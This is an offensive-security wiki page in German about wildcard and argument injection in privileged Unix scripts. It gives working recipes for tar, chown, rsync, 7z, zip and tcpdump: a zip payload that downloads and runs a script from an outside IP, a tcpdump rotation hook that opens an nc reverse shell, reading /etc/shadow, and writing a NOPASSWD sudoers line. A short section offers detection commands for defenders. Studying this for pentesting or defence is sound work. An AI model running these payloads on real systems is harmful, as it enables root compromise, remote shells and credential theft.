# Zusätzliche Tricks mit Wildcards

{{#include ../../banners/hacktricks-training.md}}

> Eine **argument injection** mit Wildcards (auch *glob* genannt) tritt auf, wenn ein privilegiertes Skript ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einer nicht in Anführungszeichen gesetzten Wildcard wie `*` ausführt.  
> Da die Shell die Wildcard **vor** der Ausführung des Binaries expandiert, kann ein Angreifer, der Dateien im Arbeitsverzeichnis erstellen kann, Dateinamen mit `-` am Anfang erstellen. Diese werden dann als **Optionen statt als Daten** interpretiert, wodurch sich beliebige Flags oder sogar Befehle einschleusen lassen.<sup>[[6]](#references)</sup>
> Diese Seite fasst die nützlichsten Primitives, aktuelle Forschung und moderne Erkennungsmethoden für 2023–2025 zusammen.

## chown / chmod

Mit dem Flag `--reference` kannst du **Besitzer/Gruppe oder Berechtigungsbits aus einer Referenzdatei kopieren**, indem du einen Dateinamen ausnutzt, der wie eine Option aussieht und durch eine Wildcard expandiert wird.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Wenn root später etwas wie Folgendes ausführt:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Das expandierte `--reference=.drf.php` überschreibt den explizit angegebenen Besitzer und Modus, sodass passende Dateien Metadaten von `.drf.php` übernehmen (und sie mit dem obigen Setup für den Angreifer beschreibbar werden).<sup>[[6]](#references)</sup>

Überprüfe den gesamten privilegierten Helper, nicht nur dessen `chown`-Zeile. Eine Änderung des Besitzers kann die set-user-ID- oder set-group-ID-Bits löschen; [POSIX überlässt den privilegierten Fall der Implementierung](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Ein späteres `chmod` im selben Job kann diese Bits für zuvor ausgewählte Dateien wiederherstellen und so das Ergebnis ändern. Bestätige die tatsächliche Befehlsreihenfolge, das beschreibbare Glob-Verzeichnis, das Verhalten bei betroffenen Dateien und Links, den resultierenden Besitzer und Modus sowie, ob das Mount-Dateisystem set-user-ID-Bits berücksichtigt, bevor du dies als ausführbaren Privilegienpfad einstufst. Bei einem nicht lesbaren Helper bleiben diese Schritte unbekannt.

*PoC & Tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinierter Angriff).<sup>[[7]](#references)</sup>
Weitere Details findest du auch im klassischen DefenseCode-Paper.<sup>[[6]](#references)</sup>

---

## GNU `cp` in einem privilegierten Skript

Überprüfe ein als root ausgeführtes Skript, das aus dem vom Aufrufer ausgewählten Arbeitsverzeichnis mit einem einfachen Glob kopiert, etwa `cp .version * /etc/app/staged/`, wenn ein Benutzer mit niedrigeren Privilegien dort Dateinamen erstellen kann. GNU `cp` kann einen mit `*` expandierten Dateinamen, der mit einem Bindestrich beginnt, als Option interpretieren. Mit der Option `--preserve=mode` können die Quellmodusbits bei einer neuen Kopie erhalten bleiben, und `--target-directory` kann das Kopierziel ändern. Beide Auswirkungen müssen anhand des genauen Skriptzweigs, des Zielzustands, der effektiven Berechtigungen, der Dateisystemrichtlinien und des Verhaltens von GNU `cp` überprüft werden; der Text einer sudo-Regel oder eines Skripts allein belegt keine Rechteausweitung. GNU `cp` interpretiert führende Bindestriche nicht als Optionen, wenn den Operanden `./` vorangestellt oder die Optionsauswertung mit `--` beendet wird ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp`-Handbuch](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Führe beliebige Befehle aus, indem du die **checkpoint**-Funktion von GNU tar und checkpoint actions missbrauchst.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Sobald root z. B. `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.<sup>[[10]](#references)</sup>

### Caveat zum Überschreiben des bsdtar-/macOS-Kompressors

Das standardmäßige `tar` auf neueren macOS-Versionen (basierend auf `libarchive`) bietet nicht die `--checkpoint`-Schnittstelle von GNU tar, aber bsdtar dokumentiert **--use-compress-program** zur Auswahl eines externen Kompressors.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Wenn ein privilegiertes Skript `tar -cf backup.tar *` ausführt, wird `sh` über den `PATH` des Opfers ausgewählt und von bsdtar als Compressor gestartet.<sup>[[11]](#references)</sup> Das belegt eine Option Injection, ist für sich genommen aber kein zuverlässiger Primitive zur Ausführung beliebiger Befehle: Ein durch den Wildcard erzeugter Dateiname kann kein `/` enthalten, und bsdtar übergibt Archivdaten statt eines vom Angreifer ausgewählten Shell-Befehls. Für die Codeausführung ist zusätzlich eine kontrollierbare ausführbare Datei erforderlich, die über `PATH` aufgelöst wird, oder ein anderer Argumentkanal, über den ein geeignetes Programm angegeben werden kann.

---

## rsync

Mit `rsync` kannst du die Remote Shell oder die Remote-Binärdatei über Kommandozeilen-Flags wie `-e` und `--rsync-path` überschreiben.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Wenn root das Verzeichnis später mit `rsync -az * backup:/srv/` archiviert, kann das eingeschleuste Flag über den Remote-Shell-Mechanismus eine Shell ausführen.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync`-Modus).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Skript dem Wildcard-Zeichen *vorsorglich* `--` voranstellt (um die Optionsauswertung zu verhindern), akzeptiert die 7-Zip-CLI **Dateilisten-Dateien**, wenn dem Dateinamen ein `@` vorangestellt wird. In Kombination mit einem Symlink lassen sich so *beliebige Dateien exfiltrieren*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Wenn root etwas wie folgt ausführt:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip versucht, `root.txt` (→ `/etc/shadow`) als Dateiliste einzulesen, und bricht ab, wobei es **den Inhalt auf stderr ausgibt**.<sup>[[13]](#references)</sup>

Das funktioniert auch mit `-- *`, da die 7-Zip-CLI sowohl reguläre Dateinamen als auch `@listfiles` ausdrücklich als positionelle Eingaben akzeptiert. Daher wird ein wörtlicher Dateiname wie `@root.txt` weiterhin speziell behandelt.<sup>[[13]](#references)</sup>

---

## zip

Wenn eine Anwendung benutzergesteuerte Dateinamen an `zip` übergibt (entweder über einen wildcard oder durch Auflisten der Namen ohne `--`), gibt es zwei sehr praktische Primitive.<sup>[[2]](#references)[[3]](#references)</sup>

- RCE über einen Test-Hook: `-T` aktiviert „test archive“, und `-TT <cmd>` ersetzt das Testprogramm durch ein beliebiges Programm (Langform: `--unzip-command <cmd>`). Wenn du Dateinamen einschleusen kannst, die mit `-` beginnen, verteile die Flags auf verschiedene Dateinamen, damit das Parsen der Kurzoptionen funktioniert.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Notizen
- Versuche NICHT einen einzelnen Dateinamen wie `'-T -TT <cmd>'` — kurze Optionen werden zeichenweise geparst, und das schlägt fehl. Verwende separate Tokens wie gezeigt.<sup>[[3]](#references)</sup>
- Wenn die App Schrägstriche aus Dateinamen entfernt, rufe einen nackten Host/IP ab (Standardpfad `/index.html`), speichere die Datei mit `-O` lokal und führe sie dann aus.<sup>[[3]](#references)</sup>
- Mit `-sc` (verarbeitete argv anzeigen) oder `-h2` (weitere Hilfe) kannst du das Parsing debuggen und nachvollziehen, wie deine Tokens verarbeitet werden.<sup>[[3]](#references)</sup>

Beispiel (lokales Verhalten mit zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Datenexfiltration/leak: Wenn die Web-Ebene `zip`-stdout/stderr zurückgibt (häufig bei naiven Wrappern), werden injizierte Flags wie `--help` oder Fehler aufgrund ungültiger Optionen in der HTTP-Antwort sichtbar. So lässt sich die Command-Line-Injection bestätigen und die Anpassung der Payload erleichtern.<sup>[[3]](#references)</sup>

---

## Weitere Kandidaten für Option Injection

Wenn ein privilegierter Wrapper ein beschreibbares Verzeichnis mit einem Wildcard-Muster erweitert, lohnt es sich, diese dokumentierten Options-Hooks zu prüfen.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Ausnutzbares Flag | Wirkung |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Übergibt einen Befehlsstring an eine Shell |
| `git`   | `-c core.sshCommand=<cmd>` | Verwendet `<cmd>` statt SSH für Git-Fetch/Push |
| `scp`   | `-S <program>` | Verwendet ein alternatives SSH-kompatibles Verbindungsprogramm |

Diese Primitives sind nützliche Prüfpunkte über die Klassiker *tar/rsync/zip* hinaus.

---

## Verwundbare Wrapper und Jobs aufspüren

Aktuelle Fallstudien und Hinweise zur Erkennung zeigen, dass Wildcard/argv injection längst nicht mehr nur ein Problem mit **cron + tar** ist.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Dieselbe Fehlerklasse tritt immer wieder auf bei:

- Webfunktionen, die aus vom Angreifer kontrollierten Upload-Verzeichnissen „alles als zip/tar herunterladen“
- Debug-Shells von Anbietern oder Appliances, die einen **tcpdump**-Wrapper mit vom Angreifer kontrollierten Dateinamen- oder Filterfeldern bereitstellen
- Backup- oder Rotationsjobs, die `tar`, `rsync`, `7z`, `zip`, `chown` oder `chmod` auf beschreibbaren Verzeichnissen ausführen

Nützliche Befehle für die Triage (der `pspy`-Aufruf verwendet die dokumentierten Flags für Prozess-/Datei-Ereignisse und Intervalle).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Schnelle Faustregeln:

- `-- *` ist für viele GNU-Tools eine gute Lösung, aber **nicht** für `7z`/`7za`, da `@listfiles` separat geparst werden.<sup>[[13]](#references)</sup>
- Bei `zip` solltest du nach wrappers suchen, die vom Benutzer kontrollierte Dateinamen direkt aufzählen; das Aufteilen von Kurzoptionen (`-T` + `-TT <cmd>`) funktioniert auch ohne Shell-Glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Achte bei `tcpdump` besonders auf wrappers, mit denen du **Ausgabedateinamen**, **Rotationseinstellungen** oder Argumente zur Wiedergabe von Capture-Dateien kontrollieren kannst.<sup>[[18]](#references)</sup>

---

## tcpdump-Rotations-Hooks (-G/-W/-z): RCE durch argv-Injection in wrappers

Wenn eine eingeschränkte Shell oder ein Hersteller-Wrapper eine `tcpdump`-Befehlszeile erstellt, indem er benutzergesteuerte Felder (z. B. einen Parameter für den „Dateinamen“) ohne strikte Quoting- oder Validierungsregeln verkettet, kannst du zusätzliche `tcpdump`-Flags einschleusen. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Anzahl der Dateien begrenzen) und `-z <cmd>` (Befehl nach der Rotation) ermöglicht beliebige Befehlsausführung als Benutzer, der `tcpdump` ausführt (auf Appliances oft root).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Voraussetzungen:

- Du kannst `argv` beeinflussen, das an `tcpdump` übergeben wird (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Der Wrapper bereinigt weder Leerzeichen noch mit `-` beginnende Tokens im Dateinamenfeld.<sup>[[4]](#references)</sup>

Klassischer PoC (führt ein Reverse-Shell-Skript aus einem beschreibbaren Pfad aus).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Details:

- `-G 1` rotiert jede Sekunde, und `-W 1` beendet den Vorgang nach einer rotierten Datei; die Aufzeichnung muss vor der Rotation ein passendes Paket empfangen.<sup>[[18]](#references)</sup>
- `-z <cmd>` führt den Post-Rotate-Befehl einmal pro Rotation aus und übergibt den Pfad der geschlossenen Savefile als Argument; stelle sicher, dass die Argumentverarbeitung des Skripts/Interpreters zu deiner Payload passt.<sup>[[18]](#references)</sup>

Varianten ohne Wechseldatenträger:

- Wenn du über ein anderes Primitive Dateien schreiben kannst (z. B. einen separaten Command-Wrapper, der Ausgabeumleitung erlaubt), lege dein Skript an einem bekannten Pfad ab und löse `-z /path/script.sh` aus; lass das Skript bei Bedarf selbst `/bin/sh` aufrufen.<sup>[[18]](#references)</sup>
- Wenn ein Vendor-Wrapper dir erlaubt, den rotierten Pfad festzulegen, prüfe diese Pfadkontrolle nur in Kombination mit einem Post-Rotate-Befehl, der sein Savefile-Argument interpretiert; die Pfadkontrolle allein führt den Dateiinhalt nicht aus.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump mit Wildcards/zusätzlichen Argumenten → beliebiges Schreiben/Lesen und root

Beispiel für ein Anti-Pattern in sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Die Regel lässt unter tcpdump's dokumentiertem Parser mehrere Optionen zu:<sup>[[3]](#references)[[18]](#references)</sup>
- Das `*`-Glob und permissive Muster beschränken nur das erste `-w`-Argument. `tcpdump` akzeptiert mehrere `-w`-Optionen; die letzte gilt.<sup>[[3]](#references)[[18]](#references)</sup>
- Die Regel bindet keine anderen Optionen fest, daher sind `-Z`, `-r`, `-V` usw. zulässig.<sup>[[3]](#references)[[18]](#references)</sup>

Die relevanten Primitives sind unten dokumentiert.<sup>[[3]](#references)[[18]](#references)</sup>
- Zielpfad mit einem zweiten `-w` überschreiben (das erste erfüllt nur die sudoers-Regel).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal innerhalb des ersten `-w`, um aus dem eingeschränkten Verzeichnisbaum auszubrechen.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Dateieigentümerschaft mit `-Z root` erzwingen (erstellt an beliebigen Orten Dateien, die root gehören).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Schreiben beliebiger Inhalte durch erneutes Abspielen eines präparierten PCAP über `-r` (z. B. zum Ablegen einer sudoers-Zeile).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Erstelle ein PCAP mit der exakten ASCII-Nutzlast und schreibe es als root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Beliebiges Auslesen von Dateien/Secret-Leak mit `-V <file>` (interpretiert eine Liste von Savefiles). Fehlerdiagnosen geben häufig Zeilen wieder und leaken dabei Inhalte.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip-Argument-Injection zu RCE + tcpdump-sudo-Fehlkonfiguration für Privilege Escalation](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - vollständige Exploit-Kette](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potenzielle Shell durch Wildcard-Injection erkannt](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Zurück in die Zukunft: Unix-Wildcards außer Rand und Band (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils: Aufruf von `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils: Aufruf von `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU-tar-Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1)-Handbuch](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1)-Handbuch](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip-Kommandozeilensyntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1)-Handbuch](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Dokumentation zur Git-Konfiguration](https://git-scm.com/docs/git-config)
- [17] [OpenBSD-`scp`-Handbuch](https://man.openbsd.org/scp)
- [18] [tcpdump(8)-Handbuch](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
